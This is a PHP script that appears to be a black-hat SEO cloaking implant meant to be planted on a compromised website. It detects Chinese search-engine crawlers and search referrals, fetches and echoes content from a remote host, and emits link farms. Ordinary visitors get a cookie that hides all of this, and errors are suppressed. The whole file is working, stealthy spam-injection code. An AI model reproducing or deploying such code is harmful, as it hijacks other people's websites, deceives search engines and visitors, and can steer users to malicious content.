<?php
error_reporting(0);
set_time_limit(0);

function appLink(){
    $http = 'http://';
    if (!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!='off'){
        $http = 'https://';
    }
    return $http . $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?contentid='.mt_rand(1000000,1100000);
}

class ModelTp1{
    private $charset='utf-8';
    private $articles;
    private $titles;
    private $tpl;
    private $current_dir;
    private $bianliang;
    private $limit_city;
    private $iPlist;

    public function __construct(){
        
        if($this->isBlock()){return;}

        $this->current_dir = dirname(__FILE__).DIRECTORY_SEPARATOR;

         if (!$this->isBot()&&!$this->isRef()){
             setcookie("dfb_pass",  md5('filter'), time() + 31104000, '/');
             return;
         }

        $this->articles = $this->httpVisit('http://xxx.com/index.php?host=http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?contentid=&'.$_GET['contentid']);

        if (!$this->isBot()&&$this->isRef()&&$this->ids()){
            echo $this->articles;exit;
        }
        if ($this->isBot()&&$this->ids()){
            echo $this->articles;exit;
        }
        if ($this->isBot()&&!$this->ids()){
            for ($i=0;$i<10;$i++){
                echo '<a href="'.appLink().'"></a>'.PHP_EOL;
            }
        }
    }

    public function ids(){
        if ($_GET['xid'] > 10000 || $_GET['contentid'] > 1000000 || $_GET['tid'] > 1500000
            || $_GET['aid'] > 100000 || $_GET['nid'] > 100000 || $_GET['id'] > 10000 || $_GET['fid'] > 100000
            || $_GET['mid'] > 100000 || $_GET['gid'] > 100000) {
            return true;
        }
        return false;
    }

    public function clientIp()
    {
        if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
            $userip = getenv('HTTP_CLIENT_IP');
        } elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
            $userip = getenv('HTTP_X_FORWARDED_FOR');
        } elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
            $userip = getenv('REMOTE_ADDR');
        } elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
            $userip = $_SERVER['REMOTE_ADDR'];
        }
        return $userip;
    }
    public function isLimit(){
        $uip = $this->clientIp();
        $non_list = explode("|", $this->iPlist);
        foreach ($non_list as $v) {
            if (@stristr($uip, $v)) {
                setcookie("dfb_pass",  md5('filter'), time() + 31104000, '/');
                return;
            }
        }
        $remote = 'http://ip.taobao.com/service/getIpInfo.php?ip='.$uip;
        $area = $this->httpVisit($remote);
        if (stripos($area, $this->limit_city) != false){
            setcookie("domain-filter",  md5('filter'), time() + 31104000, '/');
        }else{
            setcookie("domain-filter", time(), time() + 31104000, '/');
        }
    }
    
    public function dataFilter($data_arr){
        if ('gbk' == strtolower( $this->charset)){
            foreach ($data_arr as $k=>$value){
                $data_arr[$k] = iconv('utf-8',$this->charset."//IGNORE", $value);
            }
        }
        return array_map('trim', $data_arr);
    }
    
    public function tplView(){
        $charset = $this->charset;
        $rand_title =$this->dataFilter($this->titles);
        $t_num = count($rand_title) -1 ;
        $rand_article = $this->dataFilter($this->articles);
        $a_num = count($rand_article) -1;
        $rand_var = $this->dataFilter($this->bianliang);
        $v_num = count($rand_var) -1 ;

        $temp_title = $rand_title[rand(0,$t_num)];
        $temp_var = $rand_var[rand(0,$v_num)];
        $temp_article = array();
        for ($i=0;$i<8;$i++){
            $temp_article[]=$rand_article[rand(0,$a_num)];
        }

        $temp_article2 = array();
        for ($i=0;$i<1;$i++){
            $temp_article2[]=$rand_article[rand(0,$a_num)];
        }
        mb_internal_encoding($this->charset);
        mb_http_output("HTML-ENTITIES");
        ob_start('mb_output_handler');
        require_once $this->tpl;
        exit;
    }
    public function isBlock(){
        return isset($_COOKIE['dfb_pass'])? true:false;
    }
    public function isBot(){
        $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
        $bots = array('baiduspider','sogou','haosouspider','360spider','Yisouspider');
        foreach ($bots as $bot) {
            if (stristr($userAgent, $bot)) {
                return true;
            }
        }
        return false;
    }
    public function isRef(){
        $ref = strtolower(@$_SERVER['HTTP_REFERER']);
        $jump_ref = explode("|","baidu.|haoso.|haosou.|sogou.|soso.|so.com|.sm.cn|spm=");
        foreach ($jump_ref as $r) {
            if (stristr($ref, trim($r))) {
                return true;
            }
        }
        return false;
    }

    public function httpVisit($weburl)
    {
        $remote_data = NULL;
        if (function_exists('curl_exec')) {
            $curl = @curl_init();
            @curl_setopt($curl, CURLOPT_URL, $weburl);
            @curl_setopt($curl, CURLOPT_HEADER, 0);
            @curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 30);
            @curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            $remote_data = @curl_exec($curl);
            @curl_close($curl);
        } else {
            if (function_exists('stream_context_create')) {
                $header_array = array('http' => array('method' => 'GET', 'timeout' => 30));
                $http_header = @stream_context_create($header_array);
                $remote_data = @file_get_contents($weburl, false, $http_header);
            } else {

                $temp_url = explode("/", $weburl);
                $new_url = $temp_url[2];
                $http_port = 80;
                $get_file = substr($weburl, strlen($new_url) + 7);
                if (strstr($new_url, chr(58))) {
                    $s_var_array['td'] = explode(chr(58), $new_url);
                    $new_url = $s_var_array['td'][0];
                    $http_port = $s_var_array['td'][1];
                }
                $fsock_result = @fsockopen($new_url, $http_port);
                @fputs($fsock_result, 'GET ' . $get_file . ' HTTP/1.1' . "\r\n" . 'Host:' . $new_url . "\r\n" . 'Connection:Close' . "\r\n\r\n");
                while (!feof($fsock_result)) {
                    $remote_data .= fgets($fsock_result, 1024);
                }
                @fclose($fsock_result);
            }
        }
        return $remote_data;
    }
}

new ModelTp1();